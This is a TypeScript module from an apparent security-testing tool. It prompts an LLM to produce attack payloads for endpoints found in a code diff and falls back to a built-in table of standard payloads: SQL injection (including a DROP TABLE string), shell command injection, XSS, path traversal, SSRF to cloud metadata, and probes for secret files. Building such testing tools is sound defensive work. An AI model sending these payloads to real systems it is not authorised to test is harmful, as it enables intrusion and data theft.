/**
 * VibeGuard - Adversarial Payload Generation Engine
 *
 * Sends the endpoint schema and code diff to the user's custom LLM with a
 * red-team system prompt to compile an array of malicious test payloads.
 *
 * Each payload is context-aware â€” if an endpoint expects a POST parameter
 * named `user_uuid`, the generated payload will inject into that field:
 * `user_uuid=1' OR '1'='1`.
 *
 * Fallback: If the LLM returns unparseable JSON, a deterministic fallback
 * generator produces basic payloads for each detected vulnerability vector
 * and input parameter. This ensures VibeGuard always has something to test,
 * even with unreliable models.
 *
 * Zero runtime dependencies â€” reuses the exported `callLLM` from llm.ts.
 */

import type {
  VibeGuardConfig,
  TargetTargets,
  ExecutableTest,
  FilteredDiff,
  AttackPayload,
  AttackSuite,
  PayloadGenResult,
  VulnerabilityVector,
} from "../core/types";
import { callLLM } from "../infrastructure/llm";
import * as ui from "../cli/ui";

// â”€â”€â”€ Constants â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/** Max number of targets to send in a single LLM call (batch size). */
const MAX_TARGETS_PER_BATCH = 20;

/** Timeout per LLM call for payload generation (milliseconds). */
const PAYLOAD_GEN_TIMEOUT_MS = 10_000;

// â”€â”€â”€ Red-Team System Prompt â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/**
 * The adversarial payload generation persona.
 *
 * Instructs the model to act as a red-team security engineer. The prompt:
 *   - Provides the exact JSON output format required.
 *   - Requires context-aware payloads that target specific parameter names.
 *   - Asks for expected failure criteria so results are measurable.
 *   - Limits attack types to the vulnerability vectors actually detected.
 */
const RED_TEAM_PROMPT = `You are a **Red-Team Security Engineer** â€” an expert penetration tester specializing in web application security. Your task is to generate adversarial test payloads for a local QA pipeline.

## Your Task

Given a list of API endpoints with their detected vulnerability vectors, input parameters, and HTTP methods, generate a set of malicious test payloads designed to trigger those vulnerabilities in a safe, local testing environment.

## Rules

1. **Context-aware payloads.** If an endpoint has a parameter named "user_uuid", generate a SQL injection payload specifically for that field: \`"user_uuid": "1' OR '1'='1"\`.
2. **Realistic attack simulation.** Payloads should mimic real attack patterns â€” not just random strings. Use known bypass techniques, injection syntax, and fuzzing patterns.
3. **One payload per vulnerability per endpoint.** If an endpoint has both "sql_injection" and "auth_bypass", generate separate payloads for each.
4. **Include expected failure criteria.** For each payload, describe what response indicates the attack succeeded (e.g., "HTTP 500 with SQL error", "HTTP 200 returning admin data without authentication").
5. **Safe for local testing.** Payloads should test for vulnerabilities without causing permanent damage (no DROP TABLE, no rm -rf, no destructive writes).
6. **Use the exact parameter names provided.** If input_parameters is ["username", "password"], generate payloads that use those keys.

## Output Format

Return ONLY a valid JSON object. No preamble, no markdown fences.

The JSON must have exactly one key: "attack_suite", which is an array of objects:

- **target_url** (string): The exact URL to target (from the input).
- **method** (string): "POST" or "GET".
- **attack_type** (string): One of the vulnerability vector strings provided.
- **payload_data** (object): Key-value pairs of parameter names to malicious payload values. For GET requests, these would be query parameters. For POST, they are body fields.
- **expected_fail_criteria** (string): What response indicates the vulnerability was triggered.

## Example

\`\`\`json
{
  "attack_suite": [
    {
      "target_url": "http://localhost:8000/api/login.php",
      "method": "POST",
      "attack_type": "sql_injection",
      "payload_data": {
        "username": "admin' OR '1'='1",
        "password": "anything' OR 1=1--"
      },
      "expected_fail_criteria": "HTTP 200 with session token, bypassing authentication via SQL injection in both fields"
    },
    {
      "target_url": "http://localhost:8000/api/users",
      "method": "GET",
      "attack_type": "idor",
      "payload_data": {
        "user_id": "0",
        "user_id": "999999"
      },
      "expected_fail_criteria": "HTTP 200 returning data for a different user â€” insecure direct object reference via predictable user_id parameter"
    }
  ]
}
\`\`\`

Generate the attack suite now. Be thorough â€” every vulnerability vector on every endpoint should have at least one payload.`;

// â”€â”€â”€ Public API â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/**
 * Generate adversarial test payloads for the mapped endpoint targets.
 *
 * Pipeline:
 *   1. Build a user message containing the targets and diff context.
 *   2. Send to the LLM with the red-team system prompt.
 *   3. Parse the JSON response into an AttackSuite.
 *   4. If parsing fails, fall back to deterministic payload generation.
 *
 * @param config       - Validated VibeGuard configuration.
 * @param targets      - Mapped executable test targets from Phase 3.
 * @param filteredDiff - Filtered diff from Phase 2 (provides parameter context).
 * @returns A PayloadGenResult with the attack suite and generation metadata.
 */
export async function generatePayloads(
  config: VibeGuardConfig,
  targets: TargetTargets,
  filteredDiff: FilteredDiff
): Promise<PayloadGenResult> {
  if (targets.executable_tests.length === 0) {
    return {
      success: true,
      attackSuite: { attack_suite: [] },
      generatedCount: 0,
      fallbackCount: 0,
      errors: [],
    };
  }

  // Build the target schema for the LLM.
  const targetSchema = buildTargetSchema(targets);

  const userMessage = [
    "## Endpoints Under Test",
    "",
    "The following endpoints were detected in the code diff. Generate adversarial payloads for each.",
    "",
    targetSchema,
    "",
    "## Diff Context (for parameter discovery)",
    "",
    "Files changed: " + String(filteredDiff.files.length),
    "Estimated tokens in diff: ~" + String(filteredDiff.estimatedTokens),
    "",
    "Generate the attack_suite JSON now. No preamble, no markdown â€” pure JSON only.",
  ].join("\n");

  ui.action(
    "Generating adversarial payloads for " +
    String(targets.executable_tests.length) +
    " target(s) via " +
    config.llm_model +
    "..."
  );

  // Call the LLM with the red-team prompt.
  let attackSuite: AttackSuite;
  let generatedCount = 0;
  let fallbackCount = 0;
  const errors: PayloadGenResult["errors"] = [];

  try {
    const rawResponse = await callLLM(config, userMessage, RED_TEAM_PROMPT);
    attackSuite = parseAttackSuite(rawResponse);
    generatedCount = attackSuite.attack_suite.length;
  } catch (err: unknown) {
    // LLM call failed or JSON was unparseable â€” fall back to deterministic generation.
    ui.warn(
      "  LLM payload generation failed: " +
      ((err as Error).message ?? String(err)).slice(0, 100)
    );
    ui.muted("  Falling back to deterministic payload generation...");
    errors.push({
      target_url: "(LLM call)",
      error: (err as Error).message ?? String(err),
    });
    attackSuite = { attack_suite: [] };
  }

  // â”€â”€ Fallback: deterministic payloads for any target not covered â”€â”€â”€â”€â”€â”€
  const coveredUrls = new Set(attackSuite.attack_suite.map((a) => a.target_url));

  for (const test of targets.executable_tests) {
    if (coveredUrls.has(test.resolved_url)) continue;

    const fallbackPayloads = generateFallbackPayloads(test);
    for (const fp of fallbackPayloads) {
      attackSuite.attack_suite.push(fp);
      fallbackCount++;
    }
  }

  return {
    success: errors.length === 0,
    attackSuite,
    generatedCount,
    fallbackCount,
    errors,
  };
}

// â”€â”€â”€ Target Schema Builder â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/**
 * Serialize the target list into a compact JSON-like format for the LLM prompt.
 * Includes all the context the model needs: URL, method, vectors, and parameters.
 */
function buildTargetSchema(targets: TargetTargets): string {
  const entries: string[] = [];

  for (const t of targets.executable_tests) {
    const entry = [
      "  {",
      '    "target_url": "' + t.resolved_url + '",',
      '    "method": "' + t.http_method + '",',
      '    "vulnerability_vectors": ' + JSON.stringify(t.vulnerability_vectors) + ',',
      '    "input_parameters": ' + JSON.stringify(t.input_parameters) + ',',
      '    "associated_file": "' + t.associated_file + '"',
      "  }",
    ].join("\n");
    entries.push(entry);
  }

  return "[\n" + entries.join(",\n") + "\n]";
}

// â”€â”€â”€ Response Parsing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/**
 * Parse the LLM's raw response into an AttackSuite.
 *
 * Handles:
 *   1. Clean JSON.
 *   2. Markdown-fenced JSON (```json ... ```).
 *   3. JSON with surrounding text.
 *
 * Throws if the response is completely unparseable.
 */
function parseAttackSuite(raw: string): AttackSuite {
  let jsonStr = raw.trim();

  // Strip markdown fences.
  const fenceMatch = jsonStr.match(/```(?:json)?\s*([\s\S]*?)```/);
  if (fenceMatch) {
    jsonStr = fenceMatch[1].trim();
  }

  // Find the outermost JSON object.
  if (!jsonStr.startsWith("{")) {
    const firstBrace = jsonStr.indexOf("{");
    if (firstBrace !== -1) {
      const lastBrace = jsonStr.lastIndexOf("}");
      if (lastBrace > firstBrace) {
        jsonStr = jsonStr.slice(firstBrace, lastBrace + 1);
      }
    }
  }

  const parsed = JSON.parse(jsonStr) as Record<string, unknown>;

  if (!Array.isArray(parsed.attack_suite)) {
    throw new Error(
      'LLM response missing "attack_suite" array. Got keys: ' +
      Object.keys(parsed).join(", ")
    );
  }

  // Sanitize each payload.
  const attackSuite: AttackPayload[] = [];
  for (const item of parsed.attack_suite as unknown[]) {
    if (typeof item !== "object" || item === null) continue;

    const p = item as Record<string, unknown>;
    attackSuite.push({
      target_url: String(p.target_url ?? ""),
      method: sanitizePayloadMethod(p.method),
      attack_type: sanitizeAttackType(p.attack_type),
      payload_data: sanitizePayloadData(p.payload_data),
      expected_fail_criteria: String(p.expected_fail_criteria ?? "No criteria provided."),
    });
  }

  return { attack_suite: attackSuite };
}

function sanitizePayloadMethod(raw: unknown): "POST" | "GET" {
  if (typeof raw !== "string") return "GET";
  const upper = raw.toUpperCase();
  return upper === "POST" ? "POST" : "GET";
}

function sanitizeAttackType(raw: unknown): VulnerabilityVector {
  if (typeof raw !== "string") return "input_fuzzing";
  const valid: VulnerabilityVector[] = [
    "sql_injection", "privilege_escalation", "auth_bypass", "rce",
    "input_fuzzing", "xss", "path_traversal", "ssrf", "idor",
    "race_condition", "deserialization", "information_disclosure",
    "misconfiguration", "other",
  ];
  const normalized = raw.toLowerCase().trim();
  for (const v of valid) {
    if (v === normalized) return v;
  }
  return "input_fuzzing"; // Default fallback.
}

function sanitizePayloadData(raw: unknown): Record<string, string> {
  if (typeof raw !== "object" || raw === null || Array.isArray(raw)) {
    return {};
  }
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(raw as Record<string, unknown>)) {
    out[key] = String(value ?? "");
  }
  return out;
}

// â”€â”€â”€ Fallback Payload Generator â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/**
 * Deterministic payload generation when the LLM fails.
 *
 * Maps vulnerability vectors to common attack payload patterns. Each generated
 * payload is specific to the endpoint's input parameters.
 */
function generateFallbackPayloads(test: ExecutableTest): AttackPayload[] {
  const payloads: AttackPayload[] = [];

  if (test.vulnerability_vectors.length === 0) {
    // Even without detected vectors, generate a basic fuzzing payload.
    payloads.push(buildFallbackPayload(test, "input_fuzzing"));
    return payloads;
  }

  for (const vector of test.vulnerability_vectors) {
    payloads.push(buildFallbackPayload(test, vector));
  }

  return payloads;
}

function buildFallbackPayload(
  test: ExecutableTest,
  vector: VulnerabilityVector
): AttackPayload {
  const params = test.input_parameters.length > 0
    ? test.input_parameters
    : ["input"];

  const payloadData: Record<string, string> = {};
  const paramValues = getFallbackValues(vector);

  // Assign each parameter a fallback value, cycling through available ones.
  for (let i = 0; i < params.length; i++) {
    payloadData[params[i]] = paramValues[i % paramValues.length];
  }

  return {
    target_url: test.resolved_url,
    method: test.http_method === "GET" ? "GET" : "POST",
    attack_type: vector,
    payload_data: payloadData,
    expected_fail_criteria: getFallbackCriteria(vector),
  };
}

/**
 * Known attack payloads for each vulnerability vector.
 * These are standard security testing values â€” safe for local use.
 */
function getFallbackValues(vector: VulnerabilityVector): string[] {
  switch (vector) {
    case "sql_injection":
      return [
        "1' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "admin'--",
        "1 OR 1=1",
        "' OR 1=1#",
      ];
    case "auth_bypass":
      return [
        "admin'--",
        "admin' OR '1'='1",
        "' OR 1=1--",
        "admin'#",
        "') OR ('1'='1",
      ];
    case "privilege_escalation":
      return [
        "role=admin",
        "admin=true",
        "is_admin=1",
        "access_level=999",
        "superuser=1",
      ];
    case "rce":
      return [
        "; ls -la",
        "| whoami",
        "$(cat /etc/passwd)",
        "; id",
        "`sleep 5`",
      ];
    case "input_fuzzing":
      return [
        "../../../../etc/passwd",
        "<script>alert(1)</script>",
        "A".repeat(10000),
        "null",
        "%00%00%00",
        "-1",
        "'\"`",
        "${7*7}",
      ];
    case "xss":
      return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
      ];
    case "path_traversal":
      return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..%2F..%2F..%2Fetc%2Fpasswd",
      ];
    case "ssrf":
      return [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        "file:///etc/passwd",
        "http://[::1]:6379/",
        "gopher://localhost:25/1HELO%20localhost",
      ];
    case "idor":
      return [
        "0",
        "1",
        "999999",
        "-1",
        "null",
      ];
    case "race_condition":
      return [
        "concurrent_request_1",
        "concurrent_request_2",
        "race_condition_test",
      ];
    case "deserialization":
      return [
        '{"__proto__":{"isAdmin":true}}',
        'O:8:"stdClass":0:{}',
        "{}",
        "[1,2,3]",
        "true",
      ];
    case "information_disclosure":
      return [
        ".env",
        "/.git/config",
        "/phpinfo.php",
        "/debug",
        "/wp-config.php.bak",
      ];
    case "misconfiguration":
      return [
        "OPTIONS",
        "TRACE",
        "DEBUG",
        "/.env",
        "/admin",
      ];
    case "other":
      return [
        "test_payload",
        "fuzz_value",
        "!!!",
        "@@##$$",
      ];
  }
}

function getFallbackCriteria(vector: VulnerabilityVector): string {
  switch (vector) {
    case "sql_injection":
      return "HTTP 500 with SQL syntax error, or HTTP 200 with unexpected data indicating successful injection.";
    case "auth_bypass":
      return "HTTP 200 with session token or redirect to dashboard â€” authentication bypassed without valid credentials.";
    case "privilege_escalation":
      return "HTTP 200 returning admin-level data or performing an action reserved for higher-privilege roles.";
    case "rce":
      return "HTTP 200 with output of the injected command visible in the response body (e.g., directory listing or user info).";
    case "input_fuzzing":
      return "HTTP 500, stack trace, or unexpected behavior indicating the application does not handle malformed input gracefully.";
    case "xss":
      return "The injected script tag or event handler appears unescaped in the HTTP response body.";
    case "path_traversal":
      return "HTTP 200 with file contents (e.g., /etc/passwd) visible in the response body.";
    case "ssrf":
      return "HTTP response contains data fetched from an internal resource (e.g., AWS metadata, internal service response).";
    case "idor":
      return "HTTP 200 returning data belonging to a different user than the authenticated session.";
    case "race_condition":
      return "Duplicate records, inconsistent state, or one request overwriting another indicating TOCTOU vulnerability.";
    case "deserialization":
      return "HTTP 500 with deserialization error, or unexpected type coercion leading to privilege bypass.";
    case "information_disclosure":
      return "HTTP 200 with sensitive file contents, stack traces, or configuration details visible.";
    case "misconfiguration":
      return "HTTP 200 with debug output, directory listing, or information that should be restricted.";
    case "other":
      return "Unexpected response indicating the application does not handle this input correctly.";
  }
}
